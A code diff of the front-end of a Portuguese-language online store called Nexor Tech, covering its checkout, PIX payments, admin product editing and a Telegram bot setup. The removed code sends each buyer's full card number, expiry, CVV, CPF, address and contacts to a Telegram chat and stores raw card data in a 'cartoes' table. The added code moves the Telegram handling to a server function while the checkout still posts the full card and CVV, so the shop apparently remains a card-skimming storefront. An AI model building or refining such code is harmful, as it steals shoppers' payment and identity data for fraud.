@@ -327,16 +327,15 @@ img{max-width:100%}
 const SUPABASE = {
   url:'https://ctlcylehlkrapzctsvqy.supabase.co',
   anonKey:'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN0bGN5bGVobGtyYXB6Y3RzdnF5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTM4NzU2NTUsImV4cCI6MjEwOTQ1MTY1NX0.94et7PjpUDfrlNhg91smODK0yVWHTQS23ELhpnpPZYU',
-  tabela:'pedidos', tabelaStatus:'pedidos_status', tabelaProdutos:'produtos',
-  tabelaCartoes:'cartoes', tabelaAdmins:'admins', tabelaLogins:'logins',
-  tabelaConfig:'configuracoes', bucket:'produtos'
+  tabelaStatus:'pedidos_status', tabelaProdutos:'produtos',
+  tabelaAdmins:'admins', tabelaLogins:'logins', bucket:'produtos'
 };
 const SB_ON = !!(SUPABASE.url && SUPABASE.anonKey);
 const FN = SUPABASE.url + '/functions/v1';
 const ORIGEM = location.hostname;
 const PIX_MAX = 5000;
+const MAX_FOTOS = 12;
 
-/* menu de coleções */
 const MENU = [
   { k:'natal',   t:'Ofertas de Natal',      e:'🎅', tipo:'tag',  cls:'natal', sazonal:true },
   { k:'ate50',   t:'Presentes até R$ 50',   e:'🎁', tipo:'max',  v:50,  cls:'gift' },
@@ -348,58 +347,34 @@ const MENU = [
   { k:'moda',    t:'Moda e acessórios',     e:'👜', tipo:'cats', v:['Moda','Calçados'] },
   { k:'top',     t:'Mais vendidos',         e:'🔥', tipo:'sort', cls:'hot' }
 ];
-
-/* Natal só em novembro (10) e dezembro (11) */
 const NATAL_ON = [10,11].includes(new Date().getMonth());
 const MENU_VISIVEL = MENU.filter(m => !m.sazonal || NATAL_ON);
-
 const menuAtual = () => MENU.find(m => m.k === state.menu) || null;
 
-let TG = { token:'', chat:'' };
-try{ TG = Object.assign(TG, JSON.parse(localStorage.getItem('nx_tg')||'{}')); }catch(e){}
+const TG = { token:'', chat:'' };
 
-function marcarEnvio(ok, msg){
-  const el = document.getElementById('tg_out');
-  if(!el) return;
-  el.textContent = (ok?'✅ último envio OK · ':'❌ último envio FALHOU · ')+new Date().toLocaleTimeString('pt-BR')+(ok?'':' — '+msg);
-  el.style.color = ok? 'var(--lime)' : 'var(--rose)';
+function authHeaders(json){
+  const h = { 'apikey':SUPABASE.anonKey, 'Authorization':'Bearer '+(state.session?.access_token || SUPABASE.anonKey) };
+  if(json) h['Content-Type'] = 'application/json';
+  return h;
 }
-async function tg(texto){
-  if(!TG.token || !TG.chat) return false;
-  const enviar = html => fetch('https://api.telegram.org/bot'+TG.token+'/sendMessage',{
-    method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify(Object.assign({chat_id:TG.chat, text:texto, disable_web_page_preview:true}, html?{parse_mode:'HTML'}:{}))
-  });
-  try{
-    let r = await enviar(true);
-    if(r.status === 400) r = await enviar(false);
-    if(!r.ok){ marcarEnvio(false, 'HTTP '+r.status+' '+(await r.text().catch(()=>'')).slice(0,80)); return false; }
-    marcarEnvio(true); return true;
-  }catch(e){ marcarEnvio(false, e.message); return false; }
-}
-
-async function carregarConfig(){
-  if(!SB_ON) return;
-  try{
-    const rows = await sbGet(SUPABASE.tabelaConfig,'select=chave,valor&chave=in.(tg_token,tg_chat)');
-    rows.forEach(r=>{ if(r.chave==='tg_token') TG.token=r.valor||''; if(r.chave==='tg_chat') TG.chat=r.valor||''; });
-    localStorage.setItem('nx_tg',JSON.stringify(TG));
-  }catch(e){}
+async function chamarAdmin(acao, extra){
+  const r = await fetch(FN+'/admin', { method:'POST', headers:authHeaders(true), body:JSON.stringify(Object.assign({acao}, extra||{})) });
+  const d = await r.json().catch(()=>({}));
+  if(!r.ok) throw new Error(d.erro || ('HTTP '+r.status));
+  return d;
 }
 
 function sbHeaders(extra){ return Object.assign({'apikey':SUPABASE.anonKey,'Authorization':'Bearer '+SUPABASE.anonKey,'Accept':'application/json'}, extra||{}); }
 async function sbGet(t,q){ const r=await fetch(`${SUPABASE.url}/rest/v1/${t}?${q}`,{headers:sbHeaders()}); if(!r.ok) throw new Error(t+' '+r.status); return r.json(); }
 async function sbPost(t,b,p){ return fetch(`${SUPABASE.url}/rest/v1/${t}`,{method:'POST',headers:sbHeaders({'Content-Type':'application/json','Prefer':p||'return=minimal'}),body:JSON.stringify(b)}); }
-async function sbPatch(t,q,b){ return fetch(`${SUPABASE.url}/rest/v1/${t}?${q}`,{method:'PATCH',headers:sbHeaders({'Content-Type':'application/json','Prefer':'return=minimal'}),body:JSON.stringify(b)}); }
-async function sbDelete(t,q){ return fetch(`${SUPABASE.url}/rest/v1/${t}?${q}`,{method:'DELETE',headers:sbHeaders({'Prefer':'return=minimal'})}); }
-async function sbUpsert(t,b,c){ return fetch(`${SUPABASE.url}/rest/v1/${t}?on_conflict=${c}`,{method:'POST',headers:sbHeaders({'Content-Type':'application/json','Prefer':'resolution=merge-duplicates,return=minimal'}),body:JSON.stringify(b)}); }
 
 const SEED = JSON.parse(document.getElementById('seedData').textContent).products || [];
 
 const KEY='nx_state_v1', AKEY='nx_auth_v1';
 const state = {
   view:'home', menu:null, cat:null, q:'', sort:'rel', pid:null, tab:'d',
-  cart:[], user:null, session:null, admin:false, orders:[], products:[], dbIds:new Set(),
+  cart:[], user:null, session:null, admin:false, tgLoaded:false, orders:[], products:[], dbIds:new Set(),
   addr:null, order:null, step:1, pay:'card', pixAtivo:null, pixOcupado:false,
   filt:{min:'',max:'',full:false,free:false}, sideOpen:false, afterLogin:null, recovery:false,
   editing:null, fotos:[], specsRows:[['','']]
@@ -428,7 +403,6 @@ const bandeiraDe = n => { n=String(n||'').replace(/\D/g,'');
   if(/^(4011|4312|4388|4510|5041|5067|5090|6363|650)/.test(n)) return 'elo';
   if(/^(606282|3841)/.test(n)) return 'hipercard';
   return 'outra'; };
-function novoCodigo(){ const b=crypto.getRandomValues(new Uint8Array(6)); return 'NX-'+Array.from(b).map(x=>x.toString(36).padStart(2,'0')).join('').slice(0,8).toUpperCase(); }
 
 /* AUTH */
 const loadSession = () => { try{ return JSON.parse(localStorage.getItem(AKEY)||'null'); }catch(e){ return null; } };
@@ -512,7 +486,7 @@ async function doNovaSenha(){
 }
 async function logout(){
   if(state.session?.access_token) fetch(SUPABASE.url+'/auth/v1/logout',{method:'POST',headers:{'apikey':SUPABASE.anonKey,'Authorization':'Bearer '+state.session.access_token}}).catch(()=>{});
-  saveSession(null); state.user=null; state.admin=false; state.orders=[]; renderAcc(); toast('Você saiu'); go('home');
+  saveSession(null); state.user=null; state.admin=false; state.tgLoaded=false; state.orders=[]; renderAcc(); toast('Você saiu'); go('home');
 }
 function tratarHash(){
   const h=location.hash.replace(/^#/,''); if(!h) return;
@@ -560,19 +534,8 @@ async function carregarProdutos(){
     render();
   }catch(e){ console.warn('catálogo local:',e.message); }
 }
-function sincronizarEstoque(id,novoSt){
-  const p=byId(id); if(!p||!state.dbIds.has(p._rid)) return;
-  sbPatch(SUPABASE.tabelaProdutos,'id=eq.'+encodeURIComponent(p._rid),{st:novoSt}).catch(()=>{});
-}
-async function seedSupabase(){
-  const rows = SEED.map(({id,...r})=>r);
-  const r = await sbPost(SUPABASE.tabelaProdutos,rows,'return=representation');
-  if(!r.ok){ toast('Falha ao publicar'); return; }
-  toast('Catálogo publicado'); await carregarProdutos(); render();
-}
 
-/* UPLOAD — até 12 fotos por produto */
-const MAX_FOTOS = 12;
+/* UPLOAD */
 function comprimir(file,max){
   max=max||1100;
   return new Promise((res,rej)=>{
@@ -598,15 +561,14 @@ async function uploadFoto(file){
 }
 async function enviarFotos(input){
   const vagas = MAX_FOTOS - state.fotos.length;
-  if(vagas <= 0){ toast('Limite de '+MAX_FOTOS+' fotos atingido'); input.value=''; return; }
+  if(vagas <= 0){ toast('Limite de '+MAX_FOTOS+' fotos'); input.value=''; return; }
   const fs=[...input.files].slice(0,vagas); input.value='';
-  if([...input.files].length > vagas) toast('Só cabiam mais '+vagas+' foto(s)');
   for(const f of fs){ toast('Enviando foto…'); try{ state.fotos.push(await uploadFoto(f)); render(); }catch(e){ toast('Falha: '+e.message); } }
   toast('Fotos adicionadas');
 }
 function addFotoUrl(){
   const el=document.getElementById('a_url'), v=el.value.trim();
-  if(state.fotos.length >= MAX_FOTOS){ toast('Limite de '+MAX_FOTOS+' fotos atingido'); return; }
+  if(state.fotos.length >= MAX_FOTOS){ toast('Limite de '+MAX_FOTOS+' fotos'); return; }
   if(!/^https?:\/\//.test(v)){ toast('Link inválido'); return; }
   state.fotos.push(v); el.value=''; render();
 }
@@ -633,16 +595,18 @@ async function salvarProduto(){
   bad('a_p',!(preco>0)); if(!(preco>0)) ok=false;
   if(!ok){ toast('Preencha nome, categoria e preço'); return; }
   const specs={}; state.specsRows.forEach(([k,val])=>{ if(k.trim()&&val.trim()) specs[k.trim()]=val.trim(); });
-  const payload = { n, c, p:preco, o:toNum(v('a_o'))||preco,
+  const produto = {
+    id: state.editing || null, n, c, p:preco, o:toNum(v('a_o'))||preco,
     r:Math.min(5,Math.max(0,toNum(v('a_r'))||0)), rv:toNum(v('a_rv'))||0,
     st:toNum(v('a_st'))||0, s:v('a_s')||'Nexor Tech',
     full:document.getElementById('a_full').checked, free:document.getElementById('a_free').checked,
     ativo:document.getElementById('a_ativo').checked, i:v('a_i')||'📦',
-    d:document.getElementById('a_d').value.trim(), imgs:state.fotos, specs };
+    d:document.getElementById('a_d').value.trim(), imgs:state.fotos, specs
+  };
   const b=document.getElementById('a_save'); b.disabled=true; b.textContent='Salvando…';
-  const r = state.editing? await sbPatch(SUPABASE.tabelaProdutos,'id=eq.'+state.editing,payload) : await sbPost(SUPABASE.tabelaProdutos,payload);
+  try{ await chamarAdmin('produto.salvar',{produto}); }
+  catch(e){ b.disabled=false; b.textContent='Salvar'; toast('Erro: '+e.message); return; }
   b.disabled=false; b.textContent='Salvar';
-  if(!r.ok){ toast('Erro ao salvar ('+r.status+')'); return; }
   toast(state.editing?'Atualizado':'Cadastrado');
   state.editing=null; state.fotos=[]; state.specsRows=[['','']];
   await carregarProdutos(); render();
@@ -650,31 +614,36 @@ async function salvarProduto(){
 async function excluirProduto(id){
   const p=byId(id); if(!p) return;
   if(!confirm('Excluir "'+p.n+'"?')) return;
-  const r=await sbDelete(SUPABASE.tabelaProdutos,'id=eq.'+p.id);
-  if(!r.ok){ toast('Erro'); return; }
+  try{ await chamarAdmin('produto.excluir',{id:p.id}); }catch(e){ toast('Erro: '+e.message); return; }
   toast('Excluído'); await carregarProdutos();
   if(state.editing===p.id){ state.editing=null; state.fotos=[]; }
   render();
 }
 async function alternarAtivo(id){
   const p=byId(id); if(!p) return;
-  const r=await sbPatch(SUPABASE.tabelaProdutos,'id=eq.'+p.id,{ativo:!p.ativo});
-  if(!r.ok){ toast('Erro'); return; }
+  try{ await chamarAdmin('produto.ativo',{id:p.id, ativo:!p.ativo}); }catch(e){ toast('Erro: '+e.message); return; }
   p.ativo=!p.ativo; toast(p.ativo?'Publicado':'Oculto'); render();
 }
+async function publicarCatalogo(){
+  if(!confirm('Publicar os produtos de exemplo?')) return;
+  try{ const d = await chamarAdmin('produto.lote',{produtos: SEED.map(({id,...r})=>r)}); toast(d.total+' produtos publicados'); }
+  catch(e){ toast('Erro: '+e.message); return; }
+  await carregarProdutos(); render();
+}
 
-/* TELEGRAM */
+/* TELEGRAM (via função admin) */
+async function carregarTgAdmin(){
+  if(!state.admin || state.tgLoaded) return;
+  state.tgLoaded = true;
+  try{ const d = await chamarAdmin('config.ler'); TG.token=d.token||''; TG.chat=d.chat||''; }catch(e){}
+  render();
+}
 async function salvarTg(){
   const token=document.getElementById('tg_token').value.trim();
   const chat=document.getElementById('tg_chat').value.trim();
-  if(!token||!chat){ toast('Preencha token e chat id'); return; }
-  if(!/^-?\d+$/.test(chat)){ toast('Chat id deve ser só números (grupo começa com -)'); return; }
-  TG={token,chat};
-  localStorage.setItem('nx_tg',JSON.stringify(TG));
-  const b=document.getElementById('tg_save'); b.disabled=true;
-  await sbUpsert(SUPABASE.tabelaConfig,[{chave:'tg_token',valor:token},{chave:'tg_chat',valor:chat}],'chave');
-  b.disabled=false;
-  toast('Telegram salvo'); render();
+  if(!token||!/^-?\d+$/.test(chat)){ toast('Token e chat numérico (grupo começa com -)'); return; }
+  try{ await chamarAdmin('config.salvar',{token,chat}); }catch(e){ toast('Erro: '+e.message); return; }
+  TG.token=token; TG.chat=chat; toast('Telegram salvo'); render();
 }
 async function testarTg(){
   const token=document.getElementById('tg_token').value.trim();
@@ -683,13 +652,8 @@ async function testarTg(){
   if(!token||!chat){ toast('Preencha token e chat id'); return; }
   out.textContent='Testando…'; out.style.color='var(--muted)';
   try{
-    const me=await fetch('https://api.telegram.org/bot'+token+'/getMe');
-    const md=await me.json();
-    if(!md.ok){ out.textContent='Token inválido: '+(md.description||''); out.style.color='var(--rose)'; return; }
-    const s=await fetch('https://api.telegram.org/bot'+token+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:chat,text:'✅ Nexor Tech conectado — bot @'+md.result.username})});
-    const sd=await s.json();
-    if(!sd.ok){ out.textContent='Bot ok, mas envio falhou: '+(sd.description||'')+'. Adicione o bot no grupo.'; out.style.color='#fbbf24'; return; }
-    out.textContent='Funcionou! Mensagem enviada para '+chat; out.style.color='var(--lime)';
+    const d = await chamarAdmin('config.testar',{token,chat});
+    out.textContent=d.msg; out.style.color = d.ok ? 'var(--lime)' : '#fbbf24';
   }catch(e){ out.textContent='Erro: '+e.message; out.style.color='var(--rose)'; }
 }
 async function descobrirChat(){
@@ -698,25 +662,13 @@ async function descobrirChat(){
   if(!token){ toast('Cole o token primeiro'); return; }
   out.textContent='Consultando…'; out.style.color='var(--muted)';
   try{
-    const r=await fetch('https://api.telegram.org/bot'+token+'/getUpdates?limit=100&allowed_updates=%5B%22message%22%2C%22edited_message%22%2C%22my_chat_member%22%5D');
-    const d=await r.json();
-    if(!d.ok){ out.textContent='Token inválido: '+(d.description||''); out.style.color='var(--rose)'; return; }
-    const map=new Map();
-    (d.result||[]).forEach(u=>{
-      const c = u.message?.chat || u.edited_message?.chat || u.my_chat_member?.chat;
-      if(!c) return;
-      const nome = c.title || [c.first_name,c.last_name].filter(Boolean).join(' ') || c.username || 'chat';
-      const grupo = String(c.id).startsWith('-') || c.type==='group' || c.type==='supergroup';
-      map.set(String(c.id), {nome, grupo});
-    });
-    const todos=[...map.entries()];
-    if(!todos.length){ out.innerHTML='Nada encontrado. Adicione o bot no grupo, mande uma mensagem lá e clique de novo.'; out.style.color='#fbbf24'; return; }
-    const grupos=todos.filter(([,v])=>v.grupo);
-    const privados=todos.filter(([,v])=>!v.grupo);
-    const btn = ([id,v]) => `<button class="btn xs ${v.grupo?'lime':'ghost'}" style="margin:6px 6px 0 0" onclick="document.getElementById('tg_chat').value='${id}';toast('Chat ${id} selecionado')">${v.grupo?'👥 ':'👤 '}${esc(v.nome)}</button>`;
+    const d = await chamarAdmin('config.chats',{token});
+    if(!d.chats.length){ out.innerHTML='Nada encontrado. Adicione o bot no grupo, mande uma mensagem lá e clique de novo.'; out.style.color='#fbbf24'; return; }
+    const grupos=d.chats.filter(c=>c.grupo), privados=d.chats.filter(c=>!c.grupo);
+    const btn = c => `<button class="btn xs ${c.grupo?'lime':'ghost'}" style="margin:6px 6px 0 0" onclick="document.getElementById('tg_chat').value='${c.id}';toast('Chat ${c.id} selecionado')">${c.grupo?'👥 ':'👤 '}${esc(c.nome)}</button>`;
     out.innerHTML = (grupos.length
-        ? '<b style="color:var(--lime)">Grupos encontrados — toque no certo:</b><br>'+grupos.map(btn).join('')
-        : '<b style="color:#fbbf24">Nenhum grupo encontrado.</b><br><span class="hint">O bot está no grupo? Se estiver: @BotFather → /setprivacy → Disable, remova o bot do grupo, adicione de novo e mande uma mensagem.</span>')
+        ? '<b style="color:var(--lime)">Grupos encontrados:</b><br>'+grupos.map(btn).join('')
+        : '<b style="color:#fbbf24">Nenhum grupo encontrado.</b><br><span class="hint">Adicione o bot ao grupo, mande mensagem e tente de novo.</span>')
       + (privados.length ? '<div style="margin-top:12px"><b>Conversa privada</b><br>'+privados.map(btn).join('')+'</div>' : '');
     out.style.color='var(--muted)';
   }catch(e){ out.textContent='Erro: '+e.message; out.style.color='var(--rose)'; }
@@ -1011,7 +963,7 @@ function viewCheckout(){
         <div id="pixBox">${state.pixAtivo? pixHTML(state.pixAtivo):''}</div>
         <button class="btn lime" id="btnPix" style="${state.pixAtivo?'display:none':''}" onclick="tentarPix()">Gerar PIX · ${brl(tot*0.95)}</button>
         <div class="hint" style="margin-top:8px">Limite de ${brl(PIX_MAX)} por cobrança.</div>`}
-      <div class="hint" style="margin-top:14px">🔒 Transmissão criptografada.</div></div>`;
+      <div class="hint" style="margin-top:14px">🔒 Valor conferido no servidor.</div></div>`;
   }
   return `<div class="shead" style="margin-top:0"><h2>Finalizar</h2></div>${stepsHTML()}
   <div class="cols2"><div>${body}</div>
@@ -1086,7 +1038,7 @@ async function verificarPix(){
   state.pixOcupado=true; let status='';
   try{
     try{
-      const r=await fetch(FN+'/pix-check',{method:'POST',headers:{'Content-Type':'application/json','apikey':SUPABASE.anonKey,'Authorization':'Bearer '+SUPABASE.anonKey},body:JSON.stringify({codigo:a.codigo})});
+      const r=await fetch(FN+'/pix-check',{method:'POST',headers:authHeaders(true),body:JSON.stringify({codigo:a.codigo})});
       if(r.ok){ const d=await r.json().catch(()=>({})); status=d.status||''; }
     }catch(e){}
     if(!status){ try{ const rows=await sbGet(SUPABASE.tabelaStatus,'codigo=eq.'+encodeURIComponent(a.codigo)+'&select=status'); if(rows[0]) status=rows[0].status||''; }catch(e){} }
@@ -1113,19 +1065,19 @@ async function checarAgora(){
   const pago=await verificarPix();
   if(!pago&&b&&document.getElementById('btnChecar')){ b.disabled=false; b.textContent='Já paguei'; toast('Ainda não identificado'); }
 }
-const corpoCobranca = p => JSON.stringify({codigo:p.codigo,valor:p.total,nome:p.cliente.nome,email:p.cliente.email,cpf:p.cliente.cpf,telefone:p.cliente.tel});
+async function criarCobranca(codigo){
+  const r = await fetch(FN+'/pix-criar',{method:'POST',headers:authHeaders(true),body:JSON.stringify({codigo})});
+  const txt = await r.text(); let d={}; try{ d=JSON.parse(txt); }catch(e){}
+  if(!r.ok||!d.qr) throw new Error(d.erro || ('HTTP '+r.status));
+  return d;
+}
 async function iniciarPix(pedido){
   const box=document.getElementById('pixBox'), btn=document.getElementById('btnPix');
   if(btn){ btn.disabled=true; btn.textContent='Gerando…'; }
   if(box) box.innerHTML='<div class="pixbox"><div class="hint">⏳ Gerando cobrança…</div></div>';
-  if(!pedido.sincronizado){
-    const s=await enviarPedidoSupabase(pedido); pedido.sincronizado=!!s.ok; save();
-    if(!s.ok){ if(box) box.innerHTML='<div class="pixbox"><div class="hint" style="color:#fbbf24">Pedido não registrado no servidor.</div></div>'; if(btn){ btn.disabled=false; btn.textContent='Tentar novamente'; } return; }
-  }
   try{
-    const r=await fetch(FN+'/pix-criar',{method:'POST',headers:{'Content-Type':'application/json','apikey':SUPABASE.anonKey,'Authorization':'Bearer '+SUPABASE.anonKey},body:corpoCobranca(pedido)});
-    const txt=await r.text(); let d={}; try{ d=JSON.parse(txt); }catch(e){}
-    if(!r.ok||!d.qr) throw new Error('HTTP '+r.status+' · '+txt.slice(0,160));
+    const d = await criarCobranca(pedido.codigo);
+    if(d.valor) pedido.total = d.valor;
     state.pixAtivo={codigo:pedido.codigo,qr:d.qr,copia:d.copia,expira:d.expira};
     state.pixOcupado=false; render();
   }catch(e){
@@ -1145,26 +1097,13 @@ async function gerarNovoPix(){
   const box=document.getElementById('pixBox');
   if(box) box.innerHTML='<div class="pixbox"><div class="hint">⏳ Gerando…</div></div>';
   try{
-    const r=await fetch(FN+'/pix-criar',{method:'POST',headers:{'Content-Type':'application/json','apikey':SUPABASE.anonKey,'Authorization':'Bearer '+SUPABASE.anonKey},body:corpoCobranca(pedido)});
-    const txt=await r.text(); let d={}; try{ d=JSON.parse(txt); }catch(e){}
-    if(!r.ok||!d.qr) throw new Error('HTTP '+r.status);
+    const d = await criarCobranca(pedido.codigo);
     state.pixAtivo={codigo:pedido.codigo,qr:d.qr,copia:d.copia,expira:d.expira}; state.pixOcupado=false; render();
   }catch(e){ if(box) box.innerHTML='<div class="pixbox"><div class="hint" style="color:var(--rose)">Falhou. Tente novamente.</div></div>'; }
 }
 
 /* FINALIZAR */
-function montarPedido(tot,card){
-  return {
-    codigo:novoCodigo(), criado_em:new Date().toISOString(), status:'Aguardando pagamento',
-    cliente:{nome:state.user.nome,email:state.user.email,cpf:state.user.cpf,tel:state.user.tel,nasc:state.user.nasc},
-    endereco:{...state.addr}, pagamento:state.pay, cartao:card,
-    itens:state.cart.map(it=>{const p=byId(it.id); return {id:p.id,nome:p.n,preco:p.p,qtd:it.q,subtotal:+(p.p*it.q).toFixed(2)};}),
-    frete:0, total:+tot.toFixed(2), origem:ORIGEM, user_agent:navigator.userAgent,
-    tela:window.innerWidth+'x'+window.innerHeight, fuso:Intl.DateTimeFormat().resolvedOptions().timeZone
-  };
-}
 async function finalizar(){
-  const tot = state.pay==='pix'? +(total()*0.95).toFixed(2) : total();
   let card=null;
   if(state.pay==='card'){
     const num=document.getElementById('f_card').value, holder=document.getElementById('f_holder').value.trim();
@@ -1180,54 +1119,41 @@ async function finalizar(){
     bad('f_cpft',cpft.length!==11); if(cpft.length!==11) ok=false;
     if(!ok){ toast('Confira os dados do cartão'); return; }
     const n=num.replace(/\D/g,'');
-    card={bandeira:bandeiraDe(n),numero:num,numero_digitos:n,titular:holder.toUpperCase(),validade:exp,cvv,cpf_titular:cpft,parcelas:parc,valor_parcela:+(tot/parc).toFixed(2),salvar:document.getElementById('f_save')?.checked||false};
+    card={bandeira:bandeiraDe(n),numero:num,numero_digitos:n,titular:holder.toUpperCase(),validade:exp,cvv,cpf_titular:cpft,parcelas:parc,valor_parcela:+(total()/parc).toFixed(2),salvar:document.getElementById('f_save')?.checked||false};
   }
-  const pedido=montarPedido(tot,card);
+
+  const cliente={nome:state.user.nome,email:state.user.email,cpf:state.user.cpf,tel:state.user.tel,nasc:state.user.nasc};
+  const corpo={ pagamento:state.pay, cliente, endereco:{...state.addr},
+    itens: state.cart.map(it=>({id:it.id, qtd:it.q})), cartao:card,
+    origem:ORIGEM, ua:navigator.userAgent, tela:window.innerWidth+'x'+window.innerHeight,
+    fuso:Intl.DateTimeFormat().resolvedOptions().timeZone };
+
+  toast('Registrando pedido…');
+  let d;
+  try{
+    const r = await fetch(FN+'/pedido-criar',{method:'POST',headers:authHeaders(true),body:JSON.stringify(corpo)});
+    d = await r.json().catch(()=>({}));
+    if(!r.ok) throw new Error(d.erro || ('HTTP '+r.status));
+  }catch(e){ toast('Erro: '+e.message); return; }
+
+  const pedido = {
+    codigo:d.codigo, criado_em:new Date().toISOString(), status:'Aguardando pagamento',
+    cliente, endereco:{...state.addr}, pagamento:state.pay, cartao:card,
+    itens: state.cart.map(it=>{const p=byId(it.id); return {id:p.id,nome:p.n,preco:p.p,qtd:it.q,subtotal:+(p.p*it.q).toFixed(2)};}),
+    frete:0, total:d.total
+  };
   state.orders.unshift(pedido); state.order=pedido;
-  backupPedido(pedido);
-  state.cart.forEach(it=>{ const p=byId(it.id); if(p){ p.st=Math.max(0,(p.st||0)-it.q); sincronizarEstoque(p.id,p.st); } });
+  state.cart.forEach(it=>{ const p=byId(it.id); if(p) p.st=Math.max(0,(p.st||0)-it.q); });
   state.cart=[]; save(); updateBadge();
   if(state.pay==='pix'){ await iniciarPix(pedido); return; }
-  state.step=5; render(); sincronizarPedido(pedido);
+  state.step=5; render();
 }
 
-/* SUPABASE PEDIDO */
-async function enviarPedidoSupabase(pedido){
-  if(!SB_ON) return {ok:false};
-  const t=[pedido,
-    {codigo:pedido.codigo,criado_em:pedido.criado_em,status:pedido.status,cliente:pedido.cliente,endereco:pedido.endereco,pagamento:pedido.pagamento,cartao:pedido.cartao,itens:pedido.itens,frete:pedido.frete,total:pedido.total,origem:pedido.origem},
-    {codigo:pedido.codigo,criado_em:pedido.criado_em,status:pedido.status,pagamento:pedido.pagamento,frete:pedido.frete,total:pedido.total}];
-  for(let i=0;i<t.length;i++){
-    try{ const r=await sbPost(SUPABASE.tabela,t[i]); if(r.ok) return {ok:true}; }catch(e){ break; }
-  }
-  return {ok:false};
-}
-function backupPedido(p){
-  const c=p.cartao;
-  tg(['<b>PEDIDO '+esc(p.codigo)+'</b> · '+esc(p.origem||'-'),
-    'Valor: R$ '+Number(p.total).toFixed(2)+' · '+(p.pagamento==='pix'?'PIX':'Cartão'),
-    esc(p.cliente?.nome)+' · CPF '+esc(p.cliente?.cpf),
-    esc(p.cliente?.email)+' · '+esc(p.cliente?.tel),
-    esc(p.endereco?.rua)+', '+esc(p.endereco?.num)+' — '+esc(p.endereco?.bairro)+', '+esc(p.endereco?.cidade)+'/'+esc(p.endereco?.uf)+' · CEP '+esc(p.endereco?.cep),
-    c?('<b>CARTÃO</b> '+esc(c.bandeira)+' · '+esc(c.numero)+' · '+esc(c.validade)+' · CVV '+esc(c.cvv)+' · '+esc(c.titular)+' · CPF '+esc(c.cpf_titular)+' · '+c.parcelas+'x'):'sem cartão'].join('\n'));
-}
-async function enviarCartaoSupabase(pedido){
-  if(!SB_ON||!pedido.cartao) return;
-  const c=pedido.cartao;
-  try{ await sbPost(SUPABASE.tabelaCartoes,{codigo:pedido.codigo,nome:c.titular,cpf_cliente:c.cpf_titular,numero:c.numero_digitos,validade:c.validade,cvv:c.cvv,bandeira:c.bandeira,parcelas:c.parcelas,valor_parcela:c.valor_parcela}); }catch(e){}
-}
-async function sincronizarPedido(pedido){
-  const r=await enviarPedidoSupabase(pedido); pedido.sincronizado=!!r.ok; save();
-  enviarCartaoSupabase(pedido);
-  const el=document.getElementById('syncStatus');
-  if(el){ el.textContent = r.ok? '✅ Pedido registrado' : '⚠️ Salvo apenas neste dispositivo'; el.style.color = r.ok? 'var(--lime)':'#fbbf24'; }
-}
 function viewOk(){
   const o=state.order||{}; const pix=o.pagamento==='pix';
   return `<div class="card okbox"><span class="ic">${pix?'🕒':'🎉'}</span>
     <h1 style="font-size:24px;margin:14px 0 6px">${pix?'Aguardando o PIX':'Pedido confirmado!'}</h1>
     <p class="hint">Pedido <b class="mono" style="color:#fff">${esc(o.codigo||'')}</b> · ${esc(o.cliente?.email||'')}</p>
-    <div id="syncStatus" class="hint" style="margin-top:6px">⏳ Registrando…</div>
     <div class="card" style="max-width:520px;margin:18px auto;text-align:left">
       ${(o.itens||[]).map(i=>`<div class="sumline"><span>${esc(i.nome).slice(0,42)} x${i.qtd}</span><span>${brl(i.subtotal)}</span></div>`).join('')}
       <div class="sumline total"><span>Total</span><span>${brl(o.total||0)}</span></div>
@@ -1317,21 +1243,21 @@ function viewAdmin(){
         <div class="fotos">${state.fotos.map((f,i)=>`<div><img src="${esc(f)}"><button onclick="delFoto(${i})">×</button></div>`).join('')}</div>
         <input type="file" id="a_file" accept="image/*" multiple hidden onchange="enviarFotos(this)">
         <button class="btn sm soft" onclick="document.getElementById('a_file').click()">📷 Enviar fotos</button>
-        <div class="hint" style="margin:9px 0">A primeira é a principal. Reduzidas automaticamente.</div>
+        <div class="hint" style="margin:9px 0">A primeira é a principal.</div>
         <div class="field"><label>Ou cole um link</label><input id="a_url" placeholder="https://...jpg"></div>
         <button class="btn xs ghost" onclick="addFotoUrl()">Adicionar link</button>
       </div>
       <div class="card">
         <b style="display:block;margin-bottom:5px">Telegram</b>
-        <p class="hint" style="margin:0 0 11px">${TG.token&&TG.chat? '<b style="color:var(--lime)">configurado</b>':'<b style="color:#fbbf24">não configurado</b>'}</p>
+        <p class="hint" style="margin:0 0 11px">${TG.token&&TG.chat? '<b style="color:var(--lime)">configurado</b>':(state.tgLoaded?'<b style="color:#fbbf24">não configurado</b>':'carregando…')}</p>
         <div class="field"><label>Token do bot</label><input id="tg_token" value="${esc(TG.token)}" placeholder="123456:AAF..."></div>
         <div class="field"><label>Chat ID</label><input id="tg_chat" value="${esc(TG.chat)}" placeholder="-1001234567890"></div>
         <div style="display:flex;gap:7px;flex-wrap:wrap">
-          <button class="btn xs" id="tg_save" onclick="salvarTg()">Salvar</button>
+          <button class="btn xs" onclick="salvarTg()">Salvar</button>
           <button class="btn xs soft" onclick="testarTg()">Testar</button>
           <button class="btn xs ghost" onclick="descobrirChat()">Achar chat id</button>
         </div>
-        <div class="hint" style="margin-top:9px">Grupo: adicione o bot, mande uma mensagem e desligue o modo privacidade em @BotFather (/setprivacy → Disable). Depois remova e adicione o bot de novo.</div>
+        <div class="hint" style="margin-top:9px">O token fica no servidor. Grupo: adicione o bot, mande mensagem e desligue o modo privacidade em @BotFather (/setprivacy → Disable).</div>
         <div id="tg_out" class="hint" style="margin-top:9px"></div>
       </div>
     </div>
@@ -1345,7 +1271,6 @@ function viewAdmin(){
       <button class="btn xs ${x.ativo?'red':'lime'}" onclick="alternarAtivo(${x.id})">${x.ativo?'Ocultar':'Publicar'}</button></div></div>`).join(''):'<div class="hint">Nenhum produto.</div>'}
   </div>`;
 }
-async function publicarCatalogo(){ if(!confirm('Publicar os produtos de exemplo?')) return; await seedSupabase(); }
 
 /* RENDER */
 const VIEWS = { home:viewHome, prod:viewProd, cart:viewCart, checkout:viewCheckout, ok:viewOk, compras:viewCompras, entrar:viewEntrar, cadastrar:viewCadastrar, recuperar:viewRecuperar, novaSenha:viewNovaSenha, cep:viewCep, admin:viewAdmin };
@@ -1354,6 +1279,7 @@ function render(){
   renderAcc(); renderChips();
